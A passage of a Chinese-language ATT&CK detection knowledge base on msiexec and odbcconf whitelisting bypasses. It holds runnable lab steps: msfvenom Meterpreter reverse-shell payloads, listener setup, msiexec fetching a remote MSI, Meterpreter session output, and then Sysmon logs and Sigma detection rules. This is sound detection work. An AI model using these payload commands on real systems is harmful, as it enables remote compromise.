http[:]//site[.]com/file.msi</p> <p>\u00b7 msiexec.exe /y \"C:\\path\\to\\file.dll\"</p> <p>\u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a<code>\u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565&gt;\u8ba1\u7b97\u673a\u914d\u7f6e&gt;\u7ba1\u7406\u6a21\u677f&gt;\u7cfb\u7edf&gt;\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa&gt;\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c&gt;\u542f\u7528</code>\uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-007-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec.exe%E6%89%A7%E8%A1%8CPayload/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-007-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec.exe%E6%89%A7%E8%A1%8CPayload/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-007-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec.exe%E6%89%A7%E8%A1%8CPayload/#_4","title":"\u73af\u5883\u51c6\u5907","text":"<p>\u653b\u51fb\u673a\uff1aKali2019</p> <p>\u9776\u673a\uff1awindows 7</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-007-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec.exe%E6%89%A7%E8%A1%8CPayload/#_5","title":"\u653b\u51fb\u5206\u6790","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-007-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec.exe%E6%89%A7%E8%A1%8CPayload/#payloaddll","title":"\u751f\u6210payload.dll","text":"<pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.126.146 lport=1234 -f msi &gt; 1.msi\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-007-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec.exe%E6%89%A7%E8%A1%8CPayload/#_6","title":"\u6267\u884c\u76d1\u542c","text":"<pre><code>msf5 &gt; use exploit/multi/handler\nmsf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp\npayload =&gt; windows/meterpreter/reverse_tcp\nmsf5 exploit(multi/handler) &gt; set lhost 192.168.126.146\nlhost =&gt; 192.168.126.146\nmsf5 exploit(multi/handler) &gt; set lport 1234\nlport =&gt; 1234\nmsf5 exploit(multi/handler) &gt;expliot\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-007-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec.exe%E6%89%A7%E8%A1%8CPayload/#payload","title":"\u9776\u673a\u6267\u884cpayload","text":"<pre><code>msiexec /q /i http://192.168.126.146/1.msi\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-007-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec.exe%E6%89%A7%E8%A1%8CPayload/#shell","title":"\u53cd\u5f39shell","text":"<pre><code>msf5 exploit(multi/handler) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.126.146:1234\n[*] Sending stage (180291 bytes) to 192.168.126.149\n[*] Meterpreter session 1 opened (192.168.126.146:1234 -&gt; 192.168.126.149:49323) at 2020-04-18 22:04:26 +0800\n\nmeterpreter &gt; getuid\nServer username: 12306Br0-PC\\12306Br0\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-007-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec.exe%E6%89%A7%E8%A1%8CPayload/#_7","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<pre><code># windows\u5b89\u5168\u65e5\u5fd7\n\u4e8b\u4ef6ID\uff1a 4688\n\u8fdb\u7a0b\u4fe1\u606f:\n\u65b0\u8fdb\u7a0b ID: 0xe78\n\u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\System32\\msiexec.exe\n\n# sysmon\u65e5\u5fd7\n\u4e8b\u4ef6ID\uff1a1\nUtcTime: 2020-04-18 14:04:16.596\nProcessGuid: {bb1f7c32-08e0-5e9b-0000-0010b8ff3f01}\nProcessId: 3704\nImage: C:\\Windows\\System32\\msiexec.exe\nFileVersion: 5.0.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Windows\u00ae installer\nProduct: Windows Installer - Unicode\nCompany: Microsoft Corporation\nOriginalFileName: msiexec.exe\nCommandLine: msiexec  /q /i http://192.168.126.146/1.msi\nCurrentDirectory: C:\\Users\\12306Br0\\\nUser: 12306Br0-PC\\12306Br0\nLogonGuid: {bb1f7c32-5fc3-5e99-0000-00201ae20600}\nLogonId: 0x6e21a\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: SHA1=443AAC22D57EDD4EF893E2A245B356CBA5B2C2DD\nParentProcessGuid: {bb1f7c32-08db-5e9b-0000-001049f63d01}\nParentProcessId: 1900\nParentImage: C:\\Windows\\System32\\cmd.exe\nParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\"\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-007-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec.exe%E6%89%A7%E8%A1%8CPayload/#_8","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-007-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec.exe%E6%89%A7%E8%A1%8CPayload/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: MsiExec Web Install\nstatus: experimental\ndescription: Detects suspicious msiexec process starts with web addreses as parameter\nreferences:\n    - https://blog.trendmicro.com/trendlabs-security-intelligence/attack-using-windows-installer-msiexec-exe-leads-lokibot/\ntags:\n    - attack.defense_evasion\nauthor: Florian Roth\ndate: 2018/02/09\nmodified: 2012/12/11\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - '* msiexec*://*'\n    condition: selection\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-007-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec.exe%E6%89%A7%E8%A1%8CPayload/#_9","title":"\u5efa\u8bae","text":"<p>\u53ef\u6839\u636e\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef64688/1\uff08\u8fdb\u7a0b\u540d\u79f0\u3001\u547d\u4ee4\u884c\uff09\u8fdb\u884c\u76d1\u63a7\u3002\u672c\u76d1\u63a7\u65b9\u6cd5\u9700\u8981\u81ea\u884c\u5b89\u88c5\u914d\u7f6e\u5ba1\u6838\u7b56\u7565/sysmon\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-007-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec.exe%E6%89%A7%E8%A1%8CPayload/#_10","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1218-007</p> <p>https://attack.mitre.org/techniques/T1218/007/</p> <p>\u57fa\u4e8e\u767d\u540d\u5355\u7684Payload</p> <p>https://blog.csdn.net/weixin_30790841/article/details/101848854</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-008-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Odbcconf.exe%E6%89%A7%E8%A1%8CPayload/","title":"T1218-008-win-\u57fa\u4e8e\u767d\u540d\u5355Odbcconf.exe\u6267\u884cPayload","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-008-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Odbcconf.exe%E6%89%A7%E8%A1%8CPayload/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u53ef\u4fe1\u6570\u5b57\u8bc1\u4e66\u7b7e\u7f72\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u5728Windows\u64cd\u4f5c\u7cfb\u7edf\u6267\u884c\u65f6\uff0c\u53ef\u901a\u8fc7\u6570\u5b57\u7b7e\u540d\u9a8c\u8bc1\u4fdd\u62a4\u3002Windows\u5b89\u88c5\u8fc7\u7a0b\u4e2d\u9ed8\u8ba4\u5b89\u88c5\u7684\u4e00\u4e9b\u5fae\u8f6f\u7b7e\u540d\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u53ef\u7528\u6765\u4ee3\u7406\u6267\u884c\u5176\u5b83\u6587\u4ef6\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6ee5\u7528\u6b64\u6280\u672f\u6765\u6267\u884c\u53ef\u80fd\u7ed5\u8fc7\u5e94\u7528\u767d\u540d\u5355\u673a\u5236\u548c\u7cfb\u7edf\u7b7e\u540d\u9a8c\u8bc1\u7684\u6076\u610f\u6587\u4ef6\u3002\u8be5\u6280\u672f\u8003\u8651\u4e86\u73b0\u6709\u6280\u672f\u4e2d\u5c1a\u672a\u8003\u8651\u7684\u4ee3\u7406\u6267\u884c\u65b9\u6cd5\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-008-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Odbcconf.exe%E6%89%A7%E8%A1%8CPayload/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>Odbcconf.exe\u662f\u5141\u8bb8\u914d\u7f6e\u5f00\u653e\u6570\u636e\u5e93\u8fde\u63a5\uff08ODBC\uff09\u9a71\u52a8\u548c\u6570\u636e\u6e90\u540d\u79f0\u7684Windows\u5de5\u5177\u3002\u653b\u51fb\u8005\u4e5f\u53ef\u80fd\u6ee5\u7528\u6b64\u5de5\u5177\u6765\u6267\u884c\u52a8\u6001\u94fe\u63a5\u5e93\uff0c\u5c31\u50cf\u5e26\u6709REGSVR\u9009\u9879\u7684Regsvr32\u4e00\u6837\u3002</p> <p>odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\file.dll\"}</p> <p>\u8bf4\u660e\uff1aOdbcconf.exe\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cOdbcconf\u547d\u4ee4\u53ef\u8bc6\u522b\uff0c\u9700\u6ce8\u610fx86\uff0cx64\u4f4d\u7684Odbcconf\u8c03\u7528\u3002</p> <p>Windows 2003 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a</p> <pre><code>C:\\WINDOWS\\system32\\odbcconf.exe\nC:\\WINDOWS\\SysWOW64\\odbcconf.exe\n</code></pre> <p>Windows 7 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a</p> <pre><code>C:\\Windows\\System32\\odbcconf.exe\nC:\\Windows\\SysWOW64\\odbcconf.exe\n</code></pre> <p>\u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a<code>\u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565&gt;\u8ba1\u7b97\u673a\u914d\u7f6e&gt;\u7ba1\u7406\u6a21\u677f&gt;\u7cfb\u7edf&gt;\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa&gt;\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c&gt;\u542f\u7528</code>\uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-008-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Odbcconf.exe%E6%89%A7%E8%A1%8CPayload/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-008-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Odbcconf.exe%E6%89%A7%E8%A1%8CPayload/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-008-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Odbcconf.exe%E6%89%A7%E8%A1%8CPayload/#_4","title":"\u73af\u5883\u51c6\u5907","text":"<p>\u653b\u51fb\u673a\uff1aKali2019</p> <p>\u9776\u673a\uff1awindows 7</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-008-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Odbcconf.exe%E6%89%A7%E8%A1%8CPayload/#_5","title":"\u653b\u51fb\u5206\u6790","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-008-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Odbcconf.exe%E6%89%A7%E8%A1%8CPayload/#payloaddll","title":"\u751f\u6210payload.dll","text":"<pre><code>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=53  -f dll -o payload.dll\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-008-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Odbcconf.exe%E6%89%A7%E8%A1%8CPayload/#_6","title":"\u6267\u884c\u76d1\u542c","text":"<p>\u653b\u51fb\u673a,\u6ce8\u610f\u914d\u7f6eset AutoRunScript migrate f (AutoRunScript\u662fmsf\u4e2d\u4e00\u4e2a\u5f3a\u5927\u7684\u81ea\u52a8\u5316\u7684\u540e\u6e17\u900f\u5de5\u5177\uff0c\u8fd9\u91ccmigrate\u53c2\u6570\u662f\u8fc1\u79fb\u6728\u9a6c\u5230\u5176\u4ed6\u8fdb\u7a0b)</p> <pre><code>msf5 &gt; use exploit/multi/handler\nmsf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp\npayload =&gt; windows/meterpreter/reverse_tcp\nmsf5 exploit(multi/handler) &gt; set lhost 192.168.126.146\nlhost =&gt; 192.168.126.146\nmsf5 exploit(multi/handler) &gt; set lport 53\nlport =&gt; 53\nmsf5 exploit(multi/handler) &gt; set AutoRunScript migrate -f\nAutoRunScript =&gt; migrate -f\nmsf5 exploit(multi/handler) &gt; exploit\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-008-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Odbcconf.exe%E6%89%A7%E8%A1%8CPayload/#payload","title":"\u9776\u673a\u6267\u884cpayload","text":"<pre><code>C:\\Windows\\SysWOW64\\odbcconf.exe /a {regsvr C:\\payload.dll}\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-008-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Odbcconf.exe%E6%89%A7%E8%A1%8CPayload/#shell","title":"\u53cd\u5f39shell","text":"<pre><code>msf5 exploit(multi/handler) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.126.146:53\n[*] Sending stage (180291 bytes) to 192.168.126.149\n[*] Meterpreter session 2 opened (192.168.126.146:53 -&gt; 192.168.126.149:49306) at 2020-04-18 20:45:29 +0800\n[*] Session ID 2 (192.168.126.146:53 -&gt; 192.168.126.149:49306) processing AutoRunScript 'migrate -f'\n[!] Meterpreter scripts are deprecated. Try post/windows/manage/migrate.\n[!] Example: run post/windows/manage/migrate OPTION=value [...]\n[*] Current server process: rundll32.exe (912)\n[*] Spawning notepad.exe process to migrate to\n[+] Migrating to 3820\n[+] Successfully migrated to process\n\nmeterpreter &gt; getuid\nServer username: 12306Br0-PC\\12306Br0\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-008-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Odbcconf.exe%E6%89%A7%E8%A1%8CPayload/#_7","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<pre><code>windows\u5b89\u5168\u65e5\u5fd7\n\u4e8b\u4ef6ID\uff1a 4688\n\u8fdb\u7a0b\u4fe1\u606f:\n\u65b0\u8fdb\u7a0b ID: 0xfec\n\u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\SysWOW64\\odbcconf.exe\n\n\u4e8b\u4ef6ID\uff1a4688\n\u8fdb\u7a0b\u4fe1\u606f:\n\u65b0\u8fdb\u7a0b ID: 0x390\n\u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\SysWOW64\\rundll32.exe\n\nsysmon\u65e5\u5fd7\n\u4e8b\u4ef6ID\uff1a1\nImage: C:\\Windows\\SysWOW64\\odbcconf.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: ODBC Driver Configuration Program\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: odbcconf.exe\nCommandLine: C:\\Windows\\SysWOW64\\odbcconf.exe  /a {regsvr C:\\payload.dll}\nCurrentDirectory: C:\\\nUser: 12306Br0-PC\\12306Br0\nLogonGuid: {bb1f7c32-5fc3-5e99-0000-00201ae20600}\nLogonId: 0x6e21a\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: SHA1=B1C49B2159C237B1F2BCE2D40508113E39143F7B\nParentProcessGuid: {bb1f7c32-f65d-5e9a-0000-0010833eef00}\nParentProcessId: 3868\nParentImage: C:\\Windows\\System32\\cmd.exe\nParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\"\n\n\u4e8b\u4ef6ID\uff1a1\nImage: C:\\Windows\\SysWOW64\\rundll32.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Windows host process (Rundll32)\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: RUNDLL32.EXE\nCommandLine: rundll32.exe\nCurrentDirectory: C:\\\nUser: 12306Br0-PC\\12306Br0\nLogonGuid: {bb1f7c32-5fc3-5e99-0000-00201ae20600}\nLogonId: 0x6e21a\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: SHA1=8939CF35447B22DD2C6E6F443446ACC1BF986D58\nParentProcessGuid: {bb1f7c32-f662-5e9a-0000-0010d648ef00}\nParentProcessId: 4076\nParentImage: C:\\Windows\\SysWOW64\\odbcconf.exe\nParentCommandLine: C:\\Windows\\SysWOW64\\odbcconf.exe  /a {regsvr C:\\payload.dll}\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-008-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Odbcconf.exe%E6%89%A7%E8%A1%8CPayload/#_8","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-008-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Odbcconf.exe%E6%89%A7%E8%A1%8CPayload/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: Application Whitelisting Bypass via DLL Loaded by odbcconf.exe\ndescription: Detects defence evasion attempt via odbcconf.exe execution to load DLL\nstatus: experimental\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Odbcconf.yml\n    - https://twitter.com/Hexacorn/status/1187143326673330176\nauthor: Kirill Kiryanov, Beyu Denis, Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/25\nmodified: 2019/11/07\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        Image|endswith: '\\odbcconf.exe'\n        CommandLine|contains:\n            - '-f'\n            - '/a'\n            - 'regsvr'\n    selection_2:\n        ParentImage|endswith: '\\odbcconf.exe'\n        Image|endswith: '\\rundll32.exe'\n    condition: selection_1 or selection_2\nlevel: medium\nfalsepositives:\n    - Legitimate use of odbcconf.exe by legitimate user\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-008-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Odbcconf.exe%E6%89%A7%E8%A1%8CPayload/#_9","title":"\u5efa\u8bae","text":"<p>\u65e0\u5177\u4f53\u68c0\u6d4b\u89c4\u5219\uff0c\u53ef\u6839\u636e\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef64688/1\uff08\u8fdb\u7a0b\u540d\u79f0\u3001\u547d\u4ee4\u884c\uff09\u8fdb\u884c\u76d1\u63a7\u3002\u672c\u76d1\u63a7\u65b9\u6cd5\u9700\u8981\u81ea\u884c\u5b89\u88c5\u914d\u7f6e\u5ba1\u6838\u7b56\u7565/sysmon\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-008-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Odbcconf.exe%E6%89%A7%E8%A1%8CPayload/#_10","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1218-008</p> <p>https://attack.mitre.org/techniques/T1218/008/</p> <p>windows\u4e0b\u57fa\u4e8e\u767d\u540d\u5355\u83b7\u53d6shell\u7684\u65b9\u6cd5\u6574\u7406\uff08\u4e0b\uff09</p> <p>http://www.safe6.cn/article/157#directory030494471069429444</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-009-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload/","title":"T11218-009-win-\u57fa\u4e8e\u767d\u540d\u5355Regasm.exe\u6267\u884cpayload","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-009-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>Windows\u547d\u4ee4\u884c\u5b9e\u7528\u7a0b\u5e8fRegsvcs\u548cRegasm\u7528\u4e8e\u6ce8\u518c.NET COM\uff08\u7ec4\u4ef6\u5bf9\u8c61\u6a21\u578b\uff09\u7a0b\u5e8f\u96c6\u3002\u4e24\u8005\u90fd\u662f\u5fae\u8f6f\u6570\u5b57\u7b7e\u540d\u7684\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528Regsvcs\u548cRegasm\u901a\u8fc7\u53d7\u4fe1\u4efb\u7684Windows\u5b9e\u7528\u7a0b\u5e8f\u6765\u4ee3\u7406\u6267\u884c\u4ee3\u7801\u3002\u8fd9\u4e24\u4e2a\u5b9e\u7528\u7a0b\u5e8f\u90fd\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u7684\u5c5e\u6027\uff0c[ComRegisterFunction]\u6216[ComUnregisterFunction]\uff0c\u6765\u6307\u5b9a\u5e94\u5728\u6ce8\u518c\u6216\u6ce8\u9500\u4e4b\u524d\u5206\u522b\u8fd0\u884c\u7684\u4ee3\u7801\uff0c\u4ece\u800c\u7ed5\u8fc7\u8fdb\u7a0b\u767d\u540d\u5355\u3002</p> <p>\u5373\u4f7f\u8fdb\u7a0b\u5728\u6ca1\u6709\u8db3\u591f\u6743\u9650\u7684\u60c5\u51b5\u4e0b\u8fd0\u884c\u5e76\u4e14\u6267\u884c\u5931\u8d25\uff0c\u4e5f\u5c06\u6267\u884c\u5177\u6709\u6ce8\u518c\u548c\u6ce8\u9500\u5c5e\u6027\u7684\u4ee3\u7801\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-009-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>Regasm \u4e3a\u7a0b\u5e8f\u96c6\u6ce8\u518c\u5de5\u5177\uff0c\u8bfb\u53d6\u7a0b\u5e8f\u96c6\u4e2d\u7684\u5143\u6570\u636e\uff0c\u5e76\u5c06\u6240\u9700\u7684\u9879\u6dfb\u52a0\u5230\u6ce8\u518c\u8868\u4e2d\u3002RegAsm.exe\u662fMicrosoft Corporation\u5f00\u53d1\u7684\u5408\u6cd5\u6587\u4ef6\u8fdb\u7a0b\u3002\u5b83\u4e0eMicrosoft.NET Assembly Registration Utility\u76f8\u5173\u8054\u3002</p> <p>\u8bf4\u660e\uff1aRegasm.exe\u6240\u5728\u8def\u5f84\u6ca1\u6709\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cREGASM\u547d\u4ee4\u65e0\u6cd5\u8bc6\u522b\u3002</p> <p>\u5177\u4f53\u53c2\u8003\u5fae\u8f6f\u5b98\u65b9\u6587\u6863\uff1a https://docs.microsoft.com/en-us/dotnet/framework/tools/regasm-exe-assembly-registration-tool</p> <p>\u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a<code>\u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565&gt;\u8ba1\u7b97\u673a\u914d\u7f6e&gt;\u7ba1\u7406\u6a21\u677f&gt;\u7cfb\u7edf&gt;\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa&gt;\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c&gt;\u542f\u7528</code>\uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002</p> <p>win7\u9ed8\u8ba4\u8def\u5f84</p> <p><code>C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe</code></p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-009-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-009-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-009-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload/#_4","title":"\u73af\u5883\u51c6\u5907","text":"<p>\u653b\u51fb\u673a\uff1aKali2019</p> 